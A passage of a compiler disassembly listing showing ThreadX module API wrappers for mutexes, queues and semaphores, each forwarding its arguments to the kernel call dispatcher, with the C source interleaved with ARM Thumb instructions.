    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_MUTEX_PRIORITIZE_CALL, (ALIGN_TYPE) mutex_ptr, 0, 0);
 8020dfc:	4b07      	ldr	r3, [pc, #28]	; (8020e1c <_txe_mutex_prioritize+0x28>)
 8020dfe:	f859 3003 	ldr.w	r3, [r9, r3]
 8020e02:	681c      	ldr	r4, [r3, #0]
 8020e04:	6879      	ldr	r1, [r7, #4]
 8020e06:	2300      	movs	r3, #0
 8020e08:	2200      	movs	r2, #0
 8020e0a:	2020      	movs	r0, #32
 8020e0c:	47a0      	blx	r4
 8020e0e:	60f8      	str	r0, [r7, #12]

    /* Return value to the caller.  */
    return(return_value);
 8020e10:	68fb      	ldr	r3, [r7, #12]
}
 8020e12:	4618      	mov	r0, r3
 8020e14:	3714      	adds	r7, #20
 8020e16:	46bd      	mov	sp, r7
 8020e18:	bd90      	pop	{r4, r7, pc}
 8020e1a:	bf00      	nop
 8020e1c:	00000004 	.word	0x00000004

08020e20 <_txe_mutex_put>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _txe_mutex_put(TX_MUTEX *mutex_ptr)
{
 8020e20:	b590      	push	{r4, r7, lr}
 8020e22:	b085      	sub	sp, #20
 8020e24:	af00      	add	r7, sp, #0
 8020e26:	6078      	str	r0, [r7, #4]

UINT return_value;

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_MUTEX_PUT_CALL, (ALIGN_TYPE) mutex_ptr, 0, 0);
 8020e28:	4b07      	ldr	r3, [pc, #28]	; (8020e48 <_txe_mutex_put+0x28>)
 8020e2a:	f859 3003 	ldr.w	r3, [r9, r3]
 8020e2e:	681c      	ldr	r4, [r3, #0]
 8020e30:	6879      	ldr	r1, [r7, #4]
 8020e32:	2300      	movs	r3, #0
 8020e34:	2200      	movs	r2, #0
 8020e36:	2021      	movs	r0, #33	; 0x21
 8020e38:	47a0      	blx	r4
 8020e3a:	60f8      	str	r0, [r7, #12]

    /* Return value to the caller.  */
    return(return_value);
 8020e3c:	68fb      	ldr	r3, [r7, #12]
}
 8020e3e:	4618      	mov	r0, r3
 8020e40:	3714      	adds	r7, #20
 8020e42:	46bd      	mov	sp, r7
 8020e44:	bd90      	pop	{r4, r7, pc}
 8020e46:	bf00      	nop
 8020e48:	00000004 	.word	0x00000004

08020e4c <_txe_queue_create>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _txe_queue_create(TX_QUEUE *queue_ptr, CHAR *name_ptr, UINT message_size, VOID *queue_start, ULONG queue_size, UINT queue_control_block_size)
{
 8020e4c:	b590      	push	{r4, r7, lr}
 8020e4e:	b08b      	sub	sp, #44	; 0x2c
 8020e50:	af00      	add	r7, sp, #0
 8020e52:	60f8      	str	r0, [r7, #12]
 8020e54:	60b9      	str	r1, [r7, #8]
 8020e56:	607a      	str	r2, [r7, #4]
 8020e58:	603b      	str	r3, [r7, #0]

UINT return_value;
ALIGN_TYPE extra_parameters[4];

    extra_parameters[0] = (ALIGN_TYPE) message_size;
 8020e5a:	687b      	ldr	r3, [r7, #4]
 8020e5c:	617b      	str	r3, [r7, #20]
    extra_parameters[1] = (ALIGN_TYPE) queue_start;
 8020e5e:	683b      	ldr	r3, [r7, #0]
 8020e60:	61bb      	str	r3, [r7, #24]
    extra_parameters[2] = (ALIGN_TYPE) queue_size;
 8020e62:	6bbb      	ldr	r3, [r7, #56]	; 0x38
 8020e64:	61fb      	str	r3, [r7, #28]
    extra_parameters[3] = (ALIGN_TYPE) queue_control_block_size;
 8020e66:	6bfb      	ldr	r3, [r7, #60]	; 0x3c
 8020e68:	623b      	str	r3, [r7, #32]

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_QUEUE_CREATE_CALL, (ALIGN_TYPE) queue_ptr, (ALIGN_TYPE) name_ptr, (ALIGN_TYPE) extra_parameters);
 8020e6a:	4b08      	ldr	r3, [pc, #32]	; (8020e8c <_txe_queue_create+0x40>)
 8020e6c:	f859 3003 	ldr.w	r3, [r9, r3]
 8020e70:	681c      	ldr	r4, [r3, #0]
 8020e72:	68f9      	ldr	r1, [r7, #12]
 8020e74:	68ba      	ldr	r2, [r7, #8]
 8020e76:	f107 0314 	add.w	r3, r7, #20
 8020e7a:	2022      	movs	r0, #34	; 0x22
 8020e7c:	47a0      	blx	r4
 8020e7e:	6278      	str	r0, [r7, #36]	; 0x24

    /* Return value to the caller.  */
    return(return_value);
 8020e80:	6a7b      	ldr	r3, [r7, #36]	; 0x24
}
 8020e82:	4618      	mov	r0, r3
 8020e84:	372c      	adds	r7, #44	; 0x2c
 8020e86:	46bd      	mov	sp, r7
 8020e88:	bd90      	pop	{r4, r7, pc}
 8020e8a:	bf00      	nop
 8020e8c:	00000004 	.word	0x00000004

08020e90 <_txe_queue_delete>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _txe_queue_delete(TX_QUEUE *queue_ptr)
{
 8020e90:	b590      	push	{r4, r7, lr}
 8020e92:	b085      	sub	sp, #20
 8020e94:	af00      	add	r7, sp, #0
 8020e96:	6078      	str	r0, [r7, #4]

UINT return_value;

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_QUEUE_DELETE_CALL, (ALIGN_TYPE) queue_ptr, 0, 0);
 8020e98:	4b07      	ldr	r3, [pc, #28]	; (8020eb8 <_txe_queue_delete+0x28>)
 8020e9a:	f859 3003 	ldr.w	r3, [r9, r3]
 8020e9e:	681c      	ldr	r4, [r3, #0]
 8020ea0:	6879      	ldr	r1, [r7, #4]
 8020ea2:	2300      	movs	r3, #0
 8020ea4:	2200      	movs	r2, #0
 8020ea6:	2023      	movs	r0, #35	; 0x23
 8020ea8:	47a0      	blx	r4
 8020eaa:	60f8      	str	r0, [r7, #12]

    /* Return value to the caller.  */
    return(return_value);
 8020eac:	68fb      	ldr	r3, [r7, #12]
}
 8020eae:	4618      	mov	r0, r3
 8020eb0:	3714      	adds	r7, #20
 8020eb2:	46bd      	mov	sp, r7
 8020eb4:	bd90      	pop	{r4, r7, pc}
 8020eb6:	bf00      	nop
 8020eb8:	00000004 	.word	0x00000004

08020ebc <_txe_queue_flush>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _txe_queue_flush(TX_QUEUE *queue_ptr)
{
 8020ebc:	b590      	push	{r4, r7, lr}
 8020ebe:	b085      	sub	sp, #20
 8020ec0:	af00      	add	r7, sp, #0
 8020ec2:	6078      	str	r0, [r7, #4]

UINT return_value;

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_QUEUE_FLUSH_CALL, (ALIGN_TYPE) queue_ptr, 0, 0);
 8020ec4:	4b07      	ldr	r3, [pc, #28]	; (8020ee4 <_txe_queue_flush+0x28>)
 8020ec6:	f859 3003 	ldr.w	r3, [r9, r3]
 8020eca:	681c      	ldr	r4, [r3, #0]
 8020ecc:	6879      	ldr	r1, [r7, #4]
 8020ece:	2300      	movs	r3, #0
 8020ed0:	2200      	movs	r2, #0
 8020ed2:	2024      	movs	r0, #36	; 0x24
 8020ed4:	47a0      	blx	r4
 8020ed6:	60f8      	str	r0, [r7, #12]

    /* Return value to the caller.  */
    return(return_value);
 8020ed8:	68fb      	ldr	r3, [r7, #12]
}
 8020eda:	4618      	mov	r0, r3
 8020edc:	3714      	adds	r7, #20
 8020ede:	46bd      	mov	sp, r7
 8020ee0:	bd90      	pop	{r4, r7, pc}
 8020ee2:	bf00      	nop
 8020ee4:	00000004 	.word	0x00000004

08020ee8 <_txe_queue_front_send>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _txe_queue_front_send(TX_QUEUE *queue_ptr, VOID *source_ptr, ULONG wait_option)
{
 8020ee8:	b590      	push	{r4, r7, lr}
 8020eea:	b087      	sub	sp, #28
 8020eec:	af00      	add	r7, sp, #0
 8020eee:	60f8      	str	r0, [r7, #12]
 8020ef0:	60b9      	str	r1, [r7, #8]
 8020ef2:	607a      	str	r2, [r7, #4]

UINT return_value;

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_QUEUE_FRONT_SEND_CALL, (ALIGN_TYPE) queue_ptr, (ALIGN_TYPE) source_ptr, (ALIGN_TYPE) wait_option);
 8020ef4:	4b07      	ldr	r3, [pc, #28]	; (8020f14 <_txe_queue_front_send+0x2c>)
 8020ef6:	f859 3003 	ldr.w	r3, [r9, r3]
 8020efa:	681c      	ldr	r4, [r3, #0]
 8020efc:	68f9      	ldr	r1, [r7, #12]
 8020efe:	68ba      	ldr	r2, [r7, #8]
 8020f00:	687b      	ldr	r3, [r7, #4]
 8020f02:	2025      	movs	r0, #37	; 0x25
 8020f04:	47a0      	blx	r4
 8020f06:	6178      	str	r0, [r7, #20]

    /* Return value to the caller.  */
    return(return_value);
 8020f08:	697b      	ldr	r3, [r7, #20]
}
 8020f0a:	4618      	mov	r0, r3
 8020f0c:	371c      	adds	r7, #28
 8020f0e:	46bd      	mov	sp, r7
 8020f10:	bd90      	pop	{r4, r7, pc}
 8020f12:	bf00      	nop
 8020f14:	00000004 	.word	0x00000004

08020f18 <_txe_queue_info_get>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _txe_queue_info_get(TX_QUEUE *queue_ptr, CHAR **name, ULONG *enqueued, ULONG *available_storage, TX_THREAD **first_suspended, ULONG *suspended_count, TX_QUEUE **next_queue)
{
 8020f18:	b590      	push	{r4, r7, lr}
 8020f1a:	b08b      	sub	sp, #44	; 0x2c
 8020f1c:	af00      	add	r7, sp, #0
 8020f1e:	60f8      	str	r0, [r7, #12]
 8020f20:	60b9      	str	r1, [r7, #8]
 8020f22:	607a      	str	r2, [r7, #4]
 8020f24:	603b      	str	r3, [r7, #0]

UINT return_value;
ALIGN_TYPE extra_parameters[5];

    extra_parameters[0] = (ALIGN_TYPE) enqueued;
 8020f26:	687b      	ldr	r3, [r7, #4]
 8020f28:	613b      	str	r3, [r7, #16]
    extra_parameters[1] = (ALIGN_TYPE) available_storage;
 8020f2a:	683b      	ldr	r3, [r7, #0]
 8020f2c:	617b      	str	r3, [r7, #20]
    extra_parameters[2] = (ALIGN_TYPE) first_suspended;
 8020f2e:	6bbb      	ldr	r3, [r7, #56]	; 0x38
 8020f30:	61bb      	str	r3, [r7, #24]
    extra_parameters[3] = (ALIGN_TYPE) suspended_count;
 8020f32:	6bfb      	ldr	r3, [r7, #60]	; 0x3c
 8020f34:	61fb      	str	r3, [r7, #28]
    extra_parameters[4] = (ALIGN_TYPE) next_queue;
 8020f36:	6c3b      	ldr	r3, [r7, #64]	; 0x40
 8020f38:	623b      	str	r3, [r7, #32]

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_QUEUE_INFO_GET_CALL, (ALIGN_TYPE) queue_ptr, (ALIGN_TYPE) name, (ALIGN_TYPE) extra_parameters);
 8020f3a:	4b08      	ldr	r3, [pc, #32]	; (8020f5c <_txe_queue_info_get+0x44>)
 8020f3c:	f859 3003 	ldr.w	r3, [r9, r3]
 8020f40:	681c      	ldr	r4, [r3, #0]
 8020f42:	68f9      	ldr	r1, [r7, #12]
 8020f44:	68ba      	ldr	r2, [r7, #8]
 8020f46:	f107 0310 	add.w	r3, r7, #16
 8020f4a:	2026      	movs	r0, #38	; 0x26
 8020f4c:	47a0      	blx	r4
 8020f4e:	6278      	str	r0, [r7, #36]	; 0x24

    /* Return value to the caller.  */
    return(return_value);
 8020f50:	6a7b      	ldr	r3, [r7, #36]	; 0x24
}
 8020f52:	4618      	mov	r0, r3
 8020f54:	372c      	adds	r7, #44	; 0x2c
 8020f56:	46bd      	mov	sp, r7
 8020f58:	bd90      	pop	{r4, r7, pc}
 8020f5a:	bf00      	nop
 8020f5c:	00000004 	.word	0x00000004

08020f60 <_tx_queue_performance_info_get>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _tx_queue_performance_info_get(TX_QUEUE *queue_ptr, ULONG *messages_sent, ULONG *messages_received, ULONG *empty_suspensions, ULONG *full_suspensions, ULONG *full_errors, ULONG *timeouts)
{
 8020f60:	b590      	push	{r4, r7, lr}
 8020f62:	b08b      	sub	sp, #44	; 0x2c
 8020f64:	af00      	add	r7, sp, #0
 8020f66:	60f8      	str	r0, [r7, #12]
 8020f68:	60b9      	str	r1, [r7, #8]
 8020f6a:	607a      	str	r2, [r7, #4]
 8020f6c:	603b      	str	r3, [r7, #0]

UINT return_value;
ALIGN_TYPE extra_parameters[5];

    extra_parameters[0] = (ALIGN_TYPE) messages_received;
 8020f6e:	687b      	ldr	r3, [r7, #4]
 8020f70:	613b      	str	r3, [r7, #16]
    extra_parameters[1] = (ALIGN_TYPE) empty_suspensions;
 8020f72:	683b      	ldr	r3, [r7, #0]
 8020f74:	617b      	str	r3, [r7, #20]
    extra_parameters[2] = (ALIGN_TYPE) full_suspensions;
 8020f76:	6bbb      	ldr	r3, [r7, #56]	; 0x38
 8020f78:	61bb      	str	r3, [r7, #24]
    extra_parameters[3] = (ALIGN_TYPE) full_errors;
 8020f7a:	6bfb      	ldr	r3, [r7, #60]	; 0x3c
 8020f7c:	61fb      	str	r3, [r7, #28]
    extra_parameters[4] = (ALIGN_TYPE) timeouts;
 8020f7e:	6c3b      	ldr	r3, [r7, #64]	; 0x40
 8020f80:	623b      	str	r3, [r7, #32]

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_QUEUE_PERFORMANCE_INFO_GET_CALL, (ALIGN_TYPE) queue_ptr, (ALIGN_TYPE) messages_sent, (ALIGN_TYPE) extra_parameters);
 8020f82:	4b08      	ldr	r3, [pc, #32]	; (8020fa4 <_tx_queue_performance_info_get+0x44>)
 8020f84:	f859 3003 	ldr.w	r3, [r9, r3]
 8020f88:	681c      	ldr	r4, [r3, #0]
 8020f8a:	68f9      	ldr	r1, [r7, #12]
 8020f8c:	68ba      	ldr	r2, [r7, #8]
 8020f8e:	f107 0310 	add.w	r3, r7, #16
 8020f92:	2027      	movs	r0, #39	; 0x27
 8020f94:	47a0      	blx	r4
 8020f96:	6278      	str	r0, [r7, #36]	; 0x24

    /* Return value to the caller.  */
    return(return_value);
 8020f98:	6a7b      	ldr	r3, [r7, #36]	; 0x24
}
 8020f9a:	4618      	mov	r0, r3
 8020f9c:	372c      	adds	r7, #44	; 0x2c
 8020f9e:	46bd      	mov	sp, r7
 8020fa0:	bd90      	pop	{r4, r7, pc}
 8020fa2:	bf00      	nop
 8020fa4:	00000004 	.word	0x00000004

08020fa8 <_tx_queue_performance_system_info_get>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _tx_queue_performance_system_info_get(ULONG *messages_sent, ULONG *messages_received, ULONG *empty_suspensions, ULONG *full_suspensions, ULONG *full_errors, ULONG *timeouts)
{
 8020fa8:	b590      	push	{r4, r7, lr}
 8020faa:	b08b      	sub	sp, #44	; 0x2c
 8020fac:	af00      	add	r7, sp, #0
 8020fae:	60f8      	str	r0, [r7, #12]
 8020fb0:	60b9      	str	r1, [r7, #8]
 8020fb2:	607a      	str	r2, [r7, #4]
 8020fb4:	603b      	str	r3, [r7, #0]

UINT return_value;
ALIGN_TYPE extra_parameters[4];

    extra_parameters[0] = (ALIGN_TYPE) empty_suspensions;
 8020fb6:	687b      	ldr	r3, [r7, #4]
 8020fb8:	617b      	str	r3, [r7, #20]
    extra_parameters[1] = (ALIGN_TYPE) full_suspensions;
 8020fba:	683b      	ldr	r3, [r7, #0]
 8020fbc:	61bb      	str	r3, [r7, #24]
    extra_parameters[2] = (ALIGN_TYPE) full_errors;
 8020fbe:	6bbb      	ldr	r3, [r7, #56]	; 0x38
 8020fc0:	61fb      	str	r3, [r7, #28]
    extra_parameters[3] = (ALIGN_TYPE) timeouts;
 8020fc2:	6bfb      	ldr	r3, [r7, #60]	; 0x3c
 8020fc4:	623b      	str	r3, [r7, #32]

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_QUEUE_PERFORMANCE_SYSTEM_INFO_GET_CALL, (ALIGN_TYPE) messages_sent, (ALIGN_TYPE) messages_received, (ALIGN_TYPE) extra_parameters);
 8020fc6:	4b08      	ldr	r3, [pc, #32]	; (8020fe8 <_tx_queue_performance_system_info_get+0x40>)
 8020fc8:	f859 3003 	ldr.w	r3, [r9, r3]
 8020fcc:	681c      	ldr	r4, [r3, #0]
 8020fce:	68f9      	ldr	r1, [r7, #12]
 8020fd0:	68ba      	ldr	r2, [r7, #8]
 8020fd2:	f107 0314 	add.w	r3, r7, #20
 8020fd6:	2028      	movs	r0, #40	; 0x28
 8020fd8:	47a0      	blx	r4
 8020fda:	6278      	str	r0, [r7, #36]	; 0x24

    /* Return value to the caller.  */
    return(return_value);
 8020fdc:	6a7b      	ldr	r3, [r7, #36]	; 0x24
}
 8020fde:	4618      	mov	r0, r3
 8020fe0:	372c      	adds	r7, #44	; 0x2c
 8020fe2:	46bd      	mov	sp, r7
 8020fe4:	bd90      	pop	{r4, r7, pc}
 8020fe6:	bf00      	nop
 8020fe8:	00000004 	.word	0x00000004

08020fec <_txe_queue_prioritize>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _txe_queue_prioritize(TX_QUEUE *queue_ptr)
{
 8020fec:	b590      	push	{r4, r7, lr}
 8020fee:	b085      	sub	sp, #20
 8020ff0:	af00      	add	r7, sp, #0
 8020ff2:	6078      	str	r0, [r7, #4]

UINT return_value;

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_QUEUE_PRIORITIZE_CALL, (ALIGN_TYPE) queue_ptr, 0, 0);
 8020ff4:	4b07      	ldr	r3, [pc, #28]	; (8021014 <_txe_queue_prioritize+0x28>)
 8020ff6:	f859 3003 	ldr.w	r3, [r9, r3]
 8020ffa:	681c      	ldr	r4, [r3, #0]
 8020ffc:	6879      	ldr	r1, [r7, #4]
 8020ffe:	2300      	movs	r3, #0
 8021000:	2200      	movs	r2, #0
 8021002:	2029      	movs	r0, #41	; 0x29
 8021004:	47a0      	blx	r4
 8021006:	60f8      	str	r0, [r7, #12]

    /* Return value to the caller.  */
    return(return_value);
 8021008:	68fb      	ldr	r3, [r7, #12]
}
 802100a:	4618      	mov	r0, r3
 802100c:	3714      	adds	r7, #20
 802100e:	46bd      	mov	sp, r7
 8021010:	bd90      	pop	{r4, r7, pc}
 8021012:	bf00      	nop
 8021014:	00000004 	.word	0x00000004

08021018 <_txe_queue_receive>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _txe_queue_receive(TX_QUEUE *queue_ptr, VOID *destination_ptr, ULONG wait_option)
{
 8021018:	b590      	push	{r4, r7, lr}
 802101a:	b087      	sub	sp, #28
 802101c:	af00      	add	r7, sp, #0
 802101e:	60f8      	str	r0, [r7, #12]
 8021020:	60b9      	str	r1, [r7, #8]
 8021022:	607a      	str	r2, [r7, #4]

UINT return_value;

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_QUEUE_RECEIVE_CALL, (ALIGN_TYPE) queue_ptr, (ALIGN_TYPE) destination_ptr, (ALIGN_TYPE) wait_option);
 8021024:	4b07      	ldr	r3, [pc, #28]	; (8021044 <_txe_queue_receive+0x2c>)
 8021026:	f859 3003 	ldr.w	r3, [r9, r3]
 802102a:	681c      	ldr	r4, [r3, #0]
 802102c:	68f9      	ldr	r1, [r7, #12]
 802102e:	68ba      	ldr	r2, [r7, #8]
 8021030:	687b      	ldr	r3, [r7, #4]
 8021032:	202a      	movs	r0, #42	; 0x2a
 8021034:	47a0      	blx	r4
 8021036:	6178      	str	r0, [r7, #20]

    /* Return value to the caller.  */
    return(return_value);
 8021038:	697b      	ldr	r3, [r7, #20]
}
 802103a:	4618      	mov	r0, r3
 802103c:	371c      	adds	r7, #28
 802103e:	46bd      	mov	sp, r7
 8021040:	bd90      	pop	{r4, r7, pc}
 8021042:	bf00      	nop
 8021044:	00000004 	.word	0x00000004

08021048 <_txe_queue_send>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _txe_queue_send(TX_QUEUE *queue_ptr, VOID *source_ptr, ULONG wait_option)
{
 8021048:	b590      	push	{r4, r7, lr}
 802104a:	b087      	sub	sp, #28
 802104c:	af00      	add	r7, sp, #0
 802104e:	60f8      	str	r0, [r7, #12]
 8021050:	60b9      	str	r1, [r7, #8]
 8021052:	607a      	str	r2, [r7, #4]

UINT return_value;

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_QUEUE_SEND_CALL, (ALIGN_TYPE) queue_ptr, (ALIGN_TYPE) source_ptr, (ALIGN_TYPE) wait_option);
 8021054:	4b07      	ldr	r3, [pc, #28]	; (8021074 <_txe_queue_send+0x2c>)
 8021056:	f859 3003 	ldr.w	r3, [r9, r3]
 802105a:	681c      	ldr	r4, [r3, #0]
 802105c:	68f9      	ldr	r1, [r7, #12]
 802105e:	68ba      	ldr	r2, [r7, #8]
 8021060:	687b      	ldr	r3, [r7, #4]
 8021062:	202b      	movs	r0, #43	; 0x2b
 8021064:	47a0      	blx	r4
 8021066:	6178      	str	r0, [r7, #20]

    /* Return value to the caller.  */
    return(return_value);
 8021068:	697b      	ldr	r3, [r7, #20]
}
 802106a:	4618      	mov	r0, r3
 802106c:	371c      	adds	r7, #28
 802106e:	46bd      	mov	sp, r7
 8021070:	bd90      	pop	{r4, r7, pc}
 8021072:	bf00      	nop
 8021074:	00000004 	.word	0x00000004

08021078 <_txe_queue_send_notify>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _txe_queue_send_notify(TX_QUEUE *queue_ptr, VOID (*queue_send_notify)(TX_QUEUE *notify_queue_ptr))
{
 8021078:	b590      	push	{r4, r7, lr}
 802107a:	b085      	sub	sp, #20
 802107c:	af00      	add	r7, sp, #0
 802107e:	6078      	str	r0, [r7, #4]
 8021080:	6039      	str	r1, [r7, #0]

UINT return_value;

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_QUEUE_SEND_NOTIFY_CALL, (ALIGN_TYPE) queue_ptr, (ALIGN_TYPE) queue_send_notify, 0);
 8021082:	4b07      	ldr	r3, [pc, #28]	; (80210a0 <_txe_queue_send_notify+0x28>)
 8021084:	f859 3003 	ldr.w	r3, [r9, r3]
 8021088:	681c      	ldr	r4, [r3, #0]
 802108a:	6879      	ldr	r1, [r7, #4]
 802108c:	683a      	ldr	r2, [r7, #0]
 802108e:	2300      	movs	r3, #0
 8021090:	202c      	movs	r0, #44	; 0x2c
 8021092:	47a0      	blx	r4
 8021094:	60f8      	str	r0, [r7, #12]

    /* Return value to the caller.  */
    return(return_value);
 8021096:	68fb      	ldr	r3, [r7, #12]
}
 8021098:	4618      	mov	r0, r3
 802109a:	3714      	adds	r7, #20
 802109c:	46bd      	mov	sp, r7
 802109e:	bd90      	pop	{r4, r7, pc}
 80210a0:	00000004 	.word	0x00000004

080210a4 <_txe_semaphore_ceiling_put>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _txe_semaphore_ceiling_put(TX_SEMAPHORE *semaphore_ptr, ULONG ceiling)
{
 80210a4:	b590      	push	{r4, r7, lr}
 80210a6:	b085      	sub	sp, #20
 80210a8:	af00      	add	r7, sp, #0
 80210aa:	6078      	str	r0, [r7, #4]
 80210ac:	6039      	str	r1, [r7, #0]

UINT return_value;

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_SEMAPHORE_CEILING_PUT_CALL, (ALIGN_TYPE) semaphore_ptr, (ALIGN_TYPE) ceiling, 0);
 80210ae:	4b07      	ldr	r3, [pc, #28]	; (80210cc <_txe_semaphore_ceiling_put+0x28>)
 80210b0:	f859 3003 	ldr.w	r3, [r9, r3]
 80210b4:	681c      	ldr	r4, [r3, #0]
 80210b6:	6879      	ldr	r1, [r7, #4]
 80210b8:	2300      	movs	r3, #0
 80210ba:	683a      	ldr	r2, [r7, #0]
 80210bc:	202d      	movs	r0, #45	; 0x2d
 80210be:	47a0      	blx	r4
 80210c0:	60f8      	str	r0, [r7, #12]

    /* Return value to the caller.  */
    return(return_value);
 80210c2:	68fb      	ldr	r3, [r7, #12]
}
 80210c4:	4618      	mov	r0, r3
 80210c6:	3714      	adds	r7, #20
 80210c8:	46bd      	mov	sp, r7
 80210ca:	bd90      	pop	{r4, r7, pc}
 80210cc:	00000004 	.word	0x00000004

080210d0 <_txe_semaphore_create>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _txe_semaphore_create(TX_SEMAPHORE *semaphore_ptr, CHAR *name_ptr, ULONG initial_count, UINT semaphore_control_block_size)
{
 80210d0:	b590      	push	{r4, r7, lr}
 80210d2:	b089      	sub	sp, #36	; 0x24
 80210d4:	af00      	add	r7, sp, #0
 80210d6:	60f8      	str	r0, [r7, #12]
 80210d8:	60b9      	str	r1, [r7, #8]
 80210da:	607a      	str	r2, [r7, #4]
 80210dc:	603b      	str	r3, [r7, #0]

UINT return_value;
ALIGN_TYPE extra_parameters[2];

    extra_parameters[0] = (ALIGN_TYPE) initial_count;
 80210de:	687b      	ldr	r3, [r7, #4]
 80210e0:	617b      	str	r3, [r7, #20]
    extra_parameters[1] = (ALIGN_TYPE) semaphore_control_block_size;
 80210e2:	683b      	ldr	r3, [r7, #0]
 80210e4:	61bb      	str	r3, [r7, #24]

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_SEMAPHORE_CREATE_CALL, (ALIGN_TYPE) semaphore_ptr, (ALIGN_TYPE) name_ptr, (ALIGN_TYPE) extra_parameters);
 80210e6:	4b08      	ldr	r3, [pc, #32]	; (8021108 <_txe_semaphore_create+0x38>)
 80210e8:	f859 3003 	ldr.w	r3, [r9, r3]
 80210ec:	681c      	ldr	r4, [r3, #0]
 80210ee:	68f9      	ldr	r1, [r7, #12]
 80210f0:	68ba      	ldr	r2, [r7, #8]
 80210f2:	f107 0314 	add.w	r3, r7, #20
 80210f6:	202e      	movs	r0, #46	; 0x2e
 80210f8:	47a0      	blx	r4
 80210fa:	61f8      	str	r0, [r7, #28]

    /* Return value to the caller.  */
    return(return_value);
 80210fc:	69fb      	ldr	r3, [r7, #28]
}
 80210fe:	4618      	mov	r0, r3
 8021100:	3724      	adds	r7, #36	; 0x24
 8021102:	46bd      	mov	sp, r7
 8021104:	bd90      	pop	{r4, r7, pc}
 8021106:	bf00      	nop
 8021108:	00000004 	.word	0x00000004

0802110c <_txe_semaphore_delete>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _txe_semaphore_delete(TX_SEMAPHORE *semaphore_ptr)
{
 802110c:	b590      	push	{r4, r7, lr}
 802110e:	b085      	sub	sp, #20
 8021110:	af00      	add	r7, sp, #0
 8021112:	6078      	str	r0, [r7, #4]

UINT return_value;

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_SEMAPHORE_DELETE_CALL, (ALIGN_TYPE) semaphore_ptr, 0, 0);
 8021114:	4b07      	ldr	r3, [pc, #28]	; (8021134 <_txe_semaphore_delete+0x28>)
 8021116:	f859 3003 	ldr.w	r3, [r9, r3]
 802111a:	681c      	ldr	r4, [r3, #0]
 802111c:	6879      	ldr	r1, [r7, #4]
 802111e:	2300      	movs	r3, #0
 8021120:	2200      	movs	r2, #0
 8021122:	202f      	movs	r0, #47	; 0x2f
 8021124:	47a0      	blx	r4
 8021126:	60f8      	str	r0, [r7, #12]

    /* Return value to the caller.  */
    return(return_value);
 8021128:	68fb      	ldr	r3, [r7, #12]
}
 802112a:	4618      	mov	r0, r3
 802112c:	3714      	adds	r7, #20
 802112e:	46bd      	mov	sp, r7
 8021130:	bd90      	pop	{r4, r7, pc}
 8021132:	bf00      	nop
 8021134:	00000004 	.word	0x00000004

08021138 <_txe_semaphore_get>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _txe_semaphore_get(TX_SEMAPHORE *semaphore_ptr, ULONG wait_option)
{
 8021138:	b590      	push	{r4, r7, lr}
 802113a:	b085      	sub	sp, #20
 802113c:	af00      	add	r7, sp, #0
 802113e:	6078      	str	r0, [r7, #4]
 8021140:	6039      	str	r1, [r7, #0]

UINT return_value;

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_SEMAPHORE_GET_CALL, (ALIGN_TYPE) semaphore_ptr, (ALIGN_TYPE) wait_option, 0);
 8021142:	4b07      	ldr	r3, [pc, #28]	; (8021160 <_txe_semaphore_get+0x28>)
